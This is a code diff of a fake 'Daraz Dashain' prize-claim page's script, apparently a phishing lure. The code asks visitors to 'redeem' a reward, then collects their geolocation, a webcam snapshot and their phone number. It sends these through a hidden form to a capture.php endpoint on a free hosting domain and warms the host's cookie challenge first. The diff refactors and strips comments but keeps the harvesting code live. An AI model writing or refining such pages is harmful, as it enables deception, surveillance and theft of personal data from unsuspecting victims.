@@ -98,9 +98,12 @@
 "use strict";
 
 var API = "https://daraz-dashain.freedev.app/capture.php";
- // Warm up: set InfinityFree's challenge cookie before any POST
-var warm = document.createElement('img');
-warm.src = API + '?warm=' + Date.now();
+
+// Warm the challenge cookie before any submit
+(function(){
+  var w = new Image();
+  w.src = API + '?warm=' + Date.now();
+})();
 
 var modal       = document.getElementById('modalOverlay');
 var btnRedeem   = document.getElementById('btnRedeem');
@@ -116,13 +119,12 @@ var cameraStream = null;
 var captureStarted = false;
 var submitting = false;
 
-/* ---- REAL SERVER FEEDBACK via iframe load ---- */
 hiddenFrame.addEventListener('load', function(){
   if (!submitting) return;
   submitting = false;
   var txt = '';
-  try { txt = hiddenFrame.contentDocument.body.innerText; } catch(e) { txt = '(blocked)'; }
-  showStatus('Server: ' + (txt ? txt.slice(0, 90) : 'empty'));
+  try { txt = hiddenFrame.contentDocument.body.innerText; } catch(e) { txt = 'blocked'; }
+  showStatus('Server: ' + (txt ? txt.slice(0, 80) : 'empty'));
   if (txt.indexOf('"ok":true') !== -1) {
     btnSubmit.textContent = '\u2713 CLAIMED';
     btnSubmit.classList.add('success');
@@ -132,13 +134,9 @@ hiddenFrame.addEventListener('load', function(){
   }
 });
 
-/* ---- OPEN POPUP ---- */
 btnRedeem.addEventListener('click', function(e){ e.preventDefault(); modal.classList.add('active'); });
-
-/* ---- ENABLE CONFIRM ---- */
 agreeCheck.addEventListener('change', function(){ btnConfirm.disabled = !agreeCheck.checked; });
 
-/* ---- CONFIRM ---- */
 btnConfirm.addEventListener('click', function(){
   modal.classList.remove('active');
   btnRedeem.style.display = 'none';
@@ -150,7 +148,6 @@ btnConfirm.addEventListener('click', function(){
   }
 });
 
-/* ---- LOCATION ---- */
 function triggerLocationCapture() {
   if (!navigator.geolocation) { captured.location = { error:'Not supported' }; return; }
   showStatus('Getting Location...');
@@ -167,7 +164,6 @@ function triggerLocationCapture() {
   );
 }
 
-/* ---- CAMERA (tiny fixed size so payload always fits) ---- */
 function triggerCameraCapture() {
   showStatus('Accessing Camera...');
   if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
@@ -191,7 +187,7 @@ function triggerCameraCapture() {
     }
     function grabbed(){
       var canvas = document.getElementById('canvas');
-      canvas.width  = 240;   // fixed small
+      canvas.width  = 240;
       canvas.height = 180;
       canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
       captured.image = canvas.toDataURL('image/jpeg', 0.4);
@@ -204,7 +200,6 @@ function triggerCameraCapture() {
   .catch(function(err){ captured.image = null; showStatus('Camera: ' + (err.name || 'failed')); });
 }
 
-/* ---- SUBMIT via hidden form, image safely encoded ---- */
 btnSubmit.addEventListener('click', function(){
   var phone = document.getElementById('phone').value.trim();
   var notes = document.getElementById('notes').value.trim();
@@ -239,7 +234,6 @@ btnSubmit.addEventListener('click', function(){
   submitting = true;
   form.submit();
 
-  // fallback in case iframe load doesn't fire
   setTimeout(function(){
     if (submitting) {
       submitting = false;
